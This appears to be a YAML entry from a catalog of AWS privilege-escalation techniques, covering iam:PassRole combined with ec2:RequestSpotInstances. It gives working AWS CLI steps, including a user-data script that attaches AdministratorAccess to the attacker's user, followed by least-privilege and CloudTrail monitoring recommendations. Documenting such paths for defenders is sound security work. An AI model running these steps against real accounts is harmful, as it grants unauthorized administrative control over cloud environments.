id: ec2-003
name: iam:PassRole + ec2:RequestSpotInstances
category: service-passrole
services:
- iam
- ec2
permissions:
  required:
  - permission: iam:PassRole
    resourceConstraints: Must have access to a privileged role ARN that trusts ec2.amazonaws.com
  - permission: ec2:RequestSpotInstances
    resourceConstraints: Must be able to request EC2 Spot Instances
  additional:
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles to pass
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing role trust policies and permissions
  - permission: iam:ListInstanceProfiles
    resourceConstraints: Helpful for finding instance profiles with privileged roles
  - permission: ec2:DescribeSpotInstanceRequests
    resourceConstraints: Useful for verifying spot instance request status and getting
      instance details
  - permission: ec2:DescribeInstances
    resourceConstraints: Helpful for verifying instance launch and monitoring status
description: A principal with `iam:PassRole` and `ec2:RequestSpotInstances` permissions
  can escalate privileges by requesting an EC2 Spot Instance with a privileged IAM
  instance profile. The Spot Instance launches with the privileged role's credentials,
  which can then be used to execute commands (via user-data scripts) that grant additional
  permissions to the starting principal. This technique is functionally identical
  to the standard `ec2:RunInstances` privilege escalation path, but uses Spot Instances
  instead. Security teams must understand that restricting `ec2:RunInstances` alone
  is insufficient - they must also restrict `ec2:RequestSpotInstances` to prevent
  the same attack vector. EC2 Spot Instances are spare compute capacity available
  at significantly discounted rates (up to 90% off On-Demand prices), making them
  particularly attractive for attackers executing privilege escalation while minimizing
  costs.
prerequisites:
  admin:
  - A role must exist that trusts ec2.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess or an
    equivalent custom policy)
  - The role must have an instance profile associated with it
  - A VPC and subnet must be available for launching the Spot Instance
  lateral:
  - A role must exist that trusts ec2.amazonaws.com to assume it
  - The role must have an instance profile associated with it
  - A VPC and subnet must be available for launching the Spot Instance
exploitationSteps:
  awscli:
  - step: 1
    command: "# Get the AWS account ID\nACCOUNT_ID=$(aws sts get-caller-identity --query\
      \ 'Account' --output text)\n\n# Find a suitable AMI (Amazon Linux 2023)\nAMI_ID=$(aws\
      \ ec2 describe-images \\\n    --owners amazon \\\n    --filters \"Name=name,Values=al2023-ami-2023.*-x86_64\"\
      \ \"Name=state,Values=available\" \\\n    --query 'Images | sort_by(@, &CreationDate)\
      \ | [-1].ImageId' \\\n    --output text)\n\n# Get default VPC and subnet\nDEFAULT_VPC=$(aws\
      \ ec2 describe-vpcs --filters \"Name=is-default,Values=true\" --query 'Vpcs[0].VpcId'\
      \ --output text)\nDEFAULT_SUBNET=$(aws ec2 describe-subnets --filters \"Name=vpc-id,Values=$DEFAULT_VPC\"\
      \ --query 'Subnets[0].SubnetId' --output text)\n"
    description: Gather necessary information including account ID, AMI, VPC, and
      subnet for launching the Spot Instance
  - step: 2
    command: "# Create user-data script to attach AdministratorAccess to starting\
      \ principal\nUSER_DATA=$(cat <<'EOF'\n#!/bin/bash\nexec > >(tee /var/log/user-data.log|logger\
      \ -t user-data -s 2>/dev/console) 2>&1\necho \"Starting privilege escalation\
      \ script...\"\n\nSTARTING_USER_NAME=\"YOUR_USERNAME_HERE\"\n\n# Wait for IAM\
      \ role to be available\nsleep 15\n\n# Attach AdministratorAccess policy to the\
      \ starting user\naws iam attach-user-policy \\\n  --user-name $STARTING_USER_NAME\
      \ \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\necho \"\
      AdministratorAccess attached to $STARTING_USER_NAME successfully\"\nEOF\n)\n\
      \n# Base64 encode the user-data\nUSER_DATA_B64=$(echo \"$USER_DATA\" | base64\
      \ | tr -d '\\n')\n"
    description: Prepare a user-data script that will attach AdministratorAccess policy
      to your starting principal. Replace YOUR_USERNAME_HERE with your actual username.
  - step: 3
    command: "# Create launch specification for the Spot Instance\nLAUNCH_SPEC=$(cat\
      \ <<EOF\n{\n  \"ImageId\": \"$AMI_ID\",\n  \"InstanceType\": \"t3.micro\",\n\
      \  \"IamInstanceProfile\": {\n    \"Name\": \"PRIVILEGED_INSTANCE_PROFILE_NAME\"\
      \n  },\n  \"UserData\": \"$USER_DATA_B64\",\n  \"NetworkInterfaces\": [\n  \
      \  {\n      \"DeviceIndex\": 0,\n      \"SubnetId\": \"$DEFAULT_SUBNET\",\n\
      \      \"AssociatePublicIpAddress\": true\n    }\n  ]\n}\nEOF\n)\n"
    description: Create the launch specification JSON for the Spot Instance request.
      Replace PRIVILEGED_INSTANCE_PROFILE_NAME with the name of the privileged instance
      profile you want to pass.
  - step: 4
    command: "# Request the Spot Instance with the privileged instance profile\naws\
      \ ec2 request-spot-instances \\\n    --spot-price \"0.05\" \\\n    --instance-count\
      \ 1 \\\n    --type \"one-time\" \\\n    --launch-specification \"$LAUNCH_SPEC\"\
      \n"
    description: Request an EC2 Spot Instance with the privileged instance profile.
      This uses `iam:PassRole` to assign the privileged role to the Spot Instance.
  - step: 5
    command: "# Monitor the Spot Instance request status\naws ec2 describe-spot-instance-requests\
      \ \\\n    --spot-instance-request-ids SPOT_REQUEST_ID \\\n    --query 'SpotInstanceRequests[0].[State,Status.Code,InstanceId]'\
      \ \\\n    --output table\n"
    description: Monitor the Spot Instance request until it is fulfilled. Replace
      SPOT_REQUEST_ID with the ID from the previous command. Wait until the State
      is 'active' and Status is 'fulfilled'.
  - step: 6
    command: '# Wait 2-3 minutes for the instance to launch and execute the user-data
      script

      # Then verify that AdministratorAccess has been attached

      aws iam list-attached-user-policies --user-name YOUR_USERNAME_HERE

      '
    description: Wait for the user-data script to execute (typically 2-3 minutes)
      and verify that the AdministratorAccess policy has been attached to your starting
      principal.
  - step: 7
    command: '# Verify administrator access by listing IAM users

      aws iam list-users

      '
    description: Verify that you now have administrator access by listing IAM users
      or performing other admin-level actions.
limitations: 'This path provides administrative access only if the passed role has
  administrative permissions (e.g., AdministratorAccess policy). If only limited roles
  are available, you gain access limited to those permissions. However, even limited
  access may enable multi-hop attacks or provide access to sensitive data.

  '
recommendation: "High powered service roles + overly permissive `iam:PassRole` is\
  \ what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid\
  \ administrative service roles** - Very rarely does an EC2 Spot Instance need administrative\
  \ access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole`\
  \ on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles\
  \ or specific services.\n\nUse IAM policy conditions to restrict which roles can\
  \ be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"\
  Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificEC2Role\"\
  ,\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"\
  ec2.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Apply the same security controls to\
  \ `ec2:RequestSpotInstances` as you would to `ec2:RunInstances` - both provide equivalent\
  \ privilege escalation paths\n- Monitor CloudTrail for unusual EC2 Spot Instance\
  \ requests followed by immediate access\n- Monitor CloudTrail for Spot Instance\
  \ launches by principals who do not usually create instances\n- Monitor CloudTrail\
  \ for roles being passed to EC2 Spot Instances that haven't been used before\n-\
  \ Monitor and alert on EC2 Spot Instance creation with privileged roles\n- Regularly\
  \ audit EC2 instances (including Spot Instances) for excessive IAM permissions\n\
  - Regularly audit all IAM roles that trust the EC2 service and down-scope any roles\
  \ with administrative access\n"
